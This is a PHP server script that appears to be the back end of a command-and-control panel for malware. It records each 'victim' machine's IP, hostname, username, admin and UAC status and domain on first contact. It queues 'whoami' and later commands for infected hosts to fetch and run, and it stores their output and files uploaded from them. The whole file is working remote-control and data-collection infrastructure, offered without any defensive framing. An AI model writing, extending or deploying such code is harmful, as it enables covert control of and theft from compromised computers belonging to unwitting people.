<?php

require_once "conn.php";
require_once "functions.php";

function LastTimeReportUpdater($db, $user_identifier)
{
    $sql = "SELECT user_identifier FROM victims WHERE user_identifier=?;";
    $stmt = mysqli_stmt_init($db);
    if (!mysqli_stmt_prepare($stmt, $sql)) {
        exit();
    } else {
        mysqli_stmt_bind_param($stmt, "s", $user_identifier);
        mysqli_stmt_execute($stmt);
        mysqli_stmt_store_result($stmt);
        $resultCheck = mysqli_stmt_num_rows($stmt);
        if ($resultCheck > 0) {
            $sql = "UPDATE `victims` SET `Last_Report` = ? WHERE `victims`.`user_identifier` = ?";
            $stmt = mysqli_prepare($db, $sql);
            mysqli_stmt_bind_param($stmt, 'si', $current_time, $user_identifier);
            mysqli_stmt_execute($stmt);
        }
    }
}

//First connction when victim open the payload.

if (isset($_POST['ip']) and $_SERVER['REQUEST_METHOD'] === 'POST') {
    $user_identifier = $_POST['user_identifier'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $active = "yes";
    $current_time = date('Y-m-d H:i:s');
    $hostname = isset($_POST['hostname']) ? $_POST['hostname'] : NULL;
    $Username = isset($_POST['username']) ? $_POST['username'] : NULL;
    $timezone = isset($_POST['timezone']) ? $_POST['timezone'] : NULL;
    $local_admin_active = isset($_POST['admin']) ? $_POST['admin'] : NULL;
    $dir_location = isset($_POST['dir_location']) ? $_POST['dir_location'] : NULL;
    $isadmin = isset($_POST['isadmin']) ? $_POST['isadmin'] : NULL;
    $domain = isset($_POST['domain']) ? $_POST['domain'] : NULL;
    $os = isset($_POST['os']) ? $_POST['os'] : "win";
    $uac = isset($_POST['uac']) ? $_POST['uac'] : NULL;
    $comments = "";

    addLogs($db, $user_identifier, $current_time, 'INFO', "User Was connected! from ip: $ip hostname: $hostname "); //LOG 

    if (empty($ip) || empty($active) || empty($current_time) || empty($user_identifier)) {
        addLogs($db, $user_identifier, date('Y-m-d H:i:s'), 'Critical', "Fake Request attempt! block $ip "); //LOG 
        exit();
    } else {

        $sql = "REPLACE INTO victims (HostName, IP, Active, Last_Report, OS, UserName ,user_identifier,timezone,uac,admin_active,isadmin, create_at,domain,dir_location ,comments) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?);";
        $stmt = mysqli_stmt_init($db);
        if (!mysqli_stmt_prepare($stmt, $sql)) {
            echo "SQL1 statement failed!";
        } else {
            mysqli_stmt_bind_param($stmt, "ssssssissssssss", $hostname, $ip, $active, $current_time, $os, $Username, $user_identifier, $timezone, $uac, $local_admin_active, $isadmin, $current_time, $domain, $dir_location, $comments);
            mysqli_stmt_execute($stmt);
            addLogs($db, $user_identifier, $current_time, 'INFO', "New user / User conncted."); //LOG

            $sql = "INSERT INTO command (user_identifier, send_command, date, challenge) VALUES (?,?,?,?);";
            if (!mysqli_stmt_prepare($stmt, $sql)) {
                echo "SQL2 statement failed!";
            } else {
                $com = "whoami";
                $challenge = rand(1, 10000000000000);;
                mysqli_stmt_bind_param($stmt, "isss", $user_identifier, $com, $current_time, $challenge);
                mysqli_stmt_execute($stmt);
                addLogs($db, $user_identifier, $current_time, 'COMMAND', " First Regiser"); //LOG 
                
            }
        }
    }
}

//The victim send GET req, and recive command to execute, and challenge for security reason.
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    $user_id = isset($_GET['user_identifier']) ? $_GET['user_identifier'] : null;
    if ($user_id == null) {
        addLogs($db, $_SERVER['REMOTE_ADDR'], date('Y-m-d H:i:s'), 'Critical', "Victim not sent Identifier!"); //LOG
        http_response_code(404);
    }

    $sql = "SELECT      *
            FROM        command
            WHERE       user_identifier = ?
            ORDER BY    date DESC
            LIMIT       1";
    $stmt = mysqli_stmt_init($db);
    if (!mysqli_stmt_prepare($stmt, $sql)) {
        echo "SQL statement failed!";
    } else {
        mysqli_stmt_bind_param($stmt, "s", $user_id);
        mysqli_stmt_execute($stmt);
        $result = mysqli_stmt_get_result($stmt);
        if ($row = mysqli_fetch_assoc($result)) {
            echo htmlspecialchars($row['send_command'], ENT_NOQUOTES), ';' . htmlspecialchars($row['challenge']);
            LastTimeReportUpdater($db, $user_id);
            addLogs($db, $user_id, date('Y-m-d H:i:s'), 'INFO', "User take command "  . htmlspecialchars($row['send_command'], ENT_NOQUOTES) . " and challenge: " . htmlspecialchars($row['challenge'])); //LOG
        }
    }
}


//get answer from the victim.

$_POST['answer'] = isset($_POST['answer']) ? $_POST['answer'] : null;
if ($_POST['answer'] and $_SERVER['REQUEST_METHOD'] === 'POST') {
    $user_identifier = $_POST['user_identifier'];
    $answer = $_POST['answer'];
    $date = date('Y-m-d H:i:s');
    $response = $_POST['res'];

    if (!empty($_FILES)) {
        $uploaddir = "upload/";
        $uploadfile = $uploaddir . basename($_FILES['upload_file']['name']);
        print_r($uploaddir);
        if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $uploadfile)) {
            $answer = "The file: " . basename($_FILES['upload_file']['name']) . " has been uploaded successfully";
        } else {
            $answer = "There was an error uploading this file:" . basename($_FILES['upload_file']['name']);
        }
    }


    if (empty($answer)) {
        addLogs($db, $_SERVER['REMOTE_ADDR'], date('Y-m-d H:i:s'), 'Critical', "Victim sent a empty answer!"); //LOG
        exit();
    } else {
        $sql = "UPDATE `victims` SET `Last_Report` = ? WHERE `user_identifier` = ?";
        $stmt = mysqli_prepare($db, $sql);
        if (!mysqli_stmt_prepare($stmt, $sql)) {
            echo "SQL statement failed!";
        } else {
            mysqli_stmt_bind_param($stmt, 'si', $date, $user_identifier);
            mysqli_stmt_execute($stmt);
        }


        $sql = "INSERT INTO recive (user_identifier, revice_output, date) VALUES (?,?,?);";
        $stmt = mysqli_stmt_init($db);
        if (!mysqli_stmt_prepare($stmt, $sql)) {
            echo "SQL1 statement failed!";
        } else {
            mysqli_stmt_bind_param($stmt, "iss", $user_identifier, $answer, $date);
            mysqli_stmt_execute($stmt);

            $sql = "
                    SELECT      challenge
                    from        command
                    WHERE       user_identifier = ?
                    ORDER BY    date DESC
                    LIMIT       1";

            $stmt = mysqli_stmt_init($db);
            if (!mysqli_stmt_prepare($stmt, $sql)) {
                echo "SQL statement failed!";
            } else {
                mysqli_stmt_bind_param($stmt, "s", $user_identifier);
                mysqli_stmt_execute($stmt);
                $result = mysqli_stmt_get_result($stmt);
                $row = mysqli_fetch_assoc($result);
                $counterForPullingReq = 0;
                while ($row['challenge'] == $response) {
                    sleep(1);
                    $counterForPullingReq += 1;
                    if (!mysqli_stmt_prepare($stmt, $sql)) {
                        echo "SQL statement failed!";
                    } else {
                        mysqli_stmt_bind_param($stmt, "s", $user_identifier);
                        mysqli_stmt_execute($stmt);
                        $result = mysqli_stmt_get_result($stmt);
                        $row = mysqli_fetch_assoc($result);
                    }
                    if ($counterForPullingReq >= 100) {
                        break;
                    }
                }
            }
        }
    }
}else{
    http_response_code(404);

}
